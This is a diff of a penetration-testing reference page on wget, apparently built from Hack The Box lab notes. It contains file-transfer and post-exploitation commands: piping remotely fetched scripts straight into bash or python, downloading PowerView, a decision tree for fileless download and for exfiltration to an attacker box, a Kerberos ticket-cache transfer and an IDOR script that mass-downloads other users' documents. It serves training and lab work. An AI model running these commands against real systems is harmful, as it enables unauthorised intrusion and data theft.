@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/wget.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Download one file to an explicit destination
+[Search this tool’s saved examples](/commands/notebook?tool=wget) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Download one file to an explicit destination
 
 **Run in:** Linux target. **Requires:** Wget installed, a reachable HTTP server and a writable local path.
 
@@ -21,137 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 wget -O file.bin 'http://KALI_IP:8000/file.bin'
 ```
 
-**Read the result:** Check the saved name, response status and whether redirects led to the intended object.
-
-**If The request works from Kali but fails from the target:** Default naming and overwrite behavior can hide an earlier result; proxy or TLS errors need investigation rather than assuming the file is absent.
+**What the result establishes:** Check the saved name, response status and whether redirects led to the intended object.
 
 **Next check:** Check the target's route, proxy settings and selected callback address; compare the received digest before use.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://www.gnu.org/software/wget/manual/wget.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## wget: choose the operation and read the result
-
-Download a file from HTTP or FTP.
-
-### What the result establishes
-
-Check the saved name, response status and whether redirects led to the intended object.
-
-### Prerequisites and common failures
-
-Default naming and overwrite behavior can hide an earlier result; proxy or TLS errors need investigation rather than assuming the file is absent.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-wget http://TARGET_IP:8000/file.zip -O file.zip
-```
-
-### Example 2: JavaScript (Windows — cscript.exe)
-
-Run in: **Saved lab example**.
-
-```cmd
-cscript.exe /nologo wget.js http://<IP>/PowerView.ps1 PowerView.ps1
-```
-
-Saved context: [File Transfers for Linux and Windows — JavaScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#javascript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: VBScript (Windows — cscript.exe)
-
-Run in: **Saved lab example**.
-
-```cmd
-cscript.exe /nologo wget.vbs http://<IP>/PowerView.ps1 PowerView.ps1
-```
-
-Saved context: [File Transfers for Linux and Windows — VBScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#vbscript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: wget and cURL
-
-Run in: **Saved lab example**.
-
-```bash
-wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
-curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
-```
-
-Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: wget and cURL
-
-Run in: **Saved lab example**.
-
-```bash
-curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
-wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
-```
-
-Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Quick Decision Tree
-
-Run in: **Saved lab example**.
-
-```text
-DOWNLOADING TO WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
-├── Only cmd.exe?       → certutil or bitsadmin
-├── Internal network?   → SMB (impacket-smbserver)
-├── Need fileless?      → IEX + DownloadString
-└── Nothing works?      → Base64 encode/decode via clipboard
-
-DOWNLOADING TO LINUX:
-├── Have curl/wget?     → Use them (simplest)
-├── Need fileless?      → curl | bash  or  wget -qO- | python3
-├── Have Python/PHP?    → Use language one-liners
-├── Nothing available?  → /dev/tcp bash trick
-└── Need encryption?    → OpenSSL s_server/s_client
-
-UPLOADING FROM WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
-├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
-├── Internal network?   → SMB or WebDAV
-└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
-
-UPLOADING FROM LINUX:
-├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
-├── Have SCP?           → scp file user@attacker:/path/
-├── Have Python?        → python3 requests.post one-liner
-└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
-```
-
-Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Enumeration workflow
-
-Run in: **Saved lab example**.
-
-```bash
-wget -r ftp://anonymous:anonymous@<IP>/        # recursively mirror the whole server
-```
-
-Saved context: [FTP Enumeration and File Access — Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#enumeration-workflow). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Download a file from HTTP or FTP.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=wget) · [All tools](/index)
 
 ## Commands
 
@@ -161,11 +41,15 @@ Replace UPPER_CASE values with your lab values.
 wget http://TARGET_IP:8000/file.zip -O file.zip
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The request works from Kali but fails from the target | Default naming and overwrite behavior can hide an earlier result; proxy or TLS errors need investigation rather than assuming the file is absent. |
 
 ## Notebook recipes
 
-20 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+19 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -254,7 +138,7 @@ wget -r ftp://anonymous:anonymous@<IP>/        # recursively mirror the whole se
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [FTP Enumeration and File Access — Example 2: Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#example-2-enumeration-workflow) · [FTP Enumeration and File Access — Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#enumeration-workflow)
+**Original note sections:** [FTP Enumeration and File Access — Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#enumeration-workflow)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -297,7 +181,7 @@ UPLOADING FROM LINUX:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -317,7 +201,7 @@ curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets out
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 4: wget and cURL](/enumeration/citrix-netscaler#example-4-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+**Original note sections:** [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -331,7 +215,27 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 5: wget and cURL](/enumeration/citrix-netscaler#example-5-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+**Original note sections:** [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Content-Type">
+
+### Content-Type
+
+**File Upload Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+grcic550@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — HTB Module — Content-Type](/web/htb/file-upload-attacks#content-type)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -468,21 +372,6 @@ proxychains wget http://172.16.1.15:8080/krb5cc_647401106_8Dt6uj
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Pass the Ticket from Linux**
-
-Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>  and the  wget `http://...:<port>`  must use the  same  port.
-
-```text
-wget http://...:<port>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="Downloading TO a Linux target">
@@ -596,42 +485,27 @@ id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; ca
 
 </Accordion>
 
-<Accordion title="Quick Web Servers (Serve Files from Target)">
+<Accordion title="Mass Enumeration">
 
-### Quick Web Servers (Serve Files from Target)
+### Mass Enumeration
 
-**File Transfers for Linux and Windows**
+**Web Attacks — HTB Module**
 
-Context from the notebook: Then from your attack box:  wget &lt;TARGET_IP>:8000/file.txt
+```bash
+#!/bin/bash
 
-```text
-wget <TARGET_IP>:8000/file.txt
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [File Transfers for Linux and Windows — Quick Web Servers (Serve Files from Target)](/post-exploitation/file-transfers-cheat-sheet#quick-web-servers-serve-files-from-target)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Troubleshooting quick reference">
-
-### Troubleshooting quick reference
-
-**Pass the Ticket from Linux**
-
-Context from the notebook: wget  to internal IP hangs/refused Kali can't reach internal net directly; or server on wrong host Run  python3 -m http.server  on the box with the file (LINUX01);  proxychains wget  from Kali; match ports
-
-```text
-proxychains wget
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -640,6 +514,10 @@ proxychains wget
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://www.gnu.org/software/wget/manual/wget.html)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -647,5 +525,3 @@ proxychains wget
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
